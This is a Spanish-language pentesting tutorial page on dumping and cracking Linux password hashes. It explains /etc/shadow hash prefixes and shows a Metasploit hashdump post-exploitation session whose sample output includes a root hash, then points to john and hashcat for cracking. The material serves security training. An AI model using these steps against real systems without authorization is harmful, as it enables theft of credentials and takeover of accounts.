# Dumping y cracking de hashes Linux

Linux admite múltiples usuarios que pueden acceder al sistema simultáneamente. Esto puede considerarse tanto una ventaja como una desventaja de seguridad, ya que ofrecen múltiples vectores de acceso y aumentan el riesgo. 

Toda la información de todas las cuentas en Linux se almacena en el archivo `/etc/passwd` y puede ser leído por cualquier usuario del sistema. Las contraseñas cifradas de los usuarios se almacenan en el archivo `/etc/shadow`, que solo puede ser accedido y leído por la cuenta root. Esta es una característica de seguridad muy importante, ya que impide que otras cuentas del sistema accedan a los hashes de las contraseñas.

El archivo shadow nos proporciona información sobre el algoritmo de hashing que se está utilizando y sobre el hash de la contraseña. Esto es muy útil, ya que podemos determinar qué tipo de algoritmo de hashing se está utilizando y su nivel de seguridad.

Podemos determinarlo observando el número que aparece después del nombre de usuario y que está delimitado por el símbolo del dólar ($).

| Prefijo   | Algoritmo    |
| --------- | ------------ |
| `$1$`     | MD5          |
| `$2$`     | Blowfish     |
| `$5$`     | SHA-256      |
| `$6$`     | SHA-512      |
| `$y$`     | yescrypt     |

## `hashdump`

En el caso de Linux podemos usar el mismo módulo, pero debido a la configuración de meterpreter es necesario hacerlo de forma externa. Una vez obtenida la sesión, podemos hacerlo de la siguiente forma:

```bash
msf > use post/linux/gather/hashdump
msf post(linux/gather/hashdump) > set session <id>
msf post(linux/gather/hashdump) > run
[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20260813160549_default_192.76.9.3_linux.hashes_695316.txt
[*] Post module execution completed
```

## Cracking de contraseñas

Este paso se puede realizar de la misma forma que hemos visto en [Windows](09_winhash.md#Cracking-de-hashes-NTLM). Simplemente debemos tener en cuenta el método con el que se ha creado el hash de la contraseña antes de ejecutar las herramientas, tanto `john` como `hashcat`.

[⟵ Anterior](09_winhash.md) | [Siguiente ⟶]()

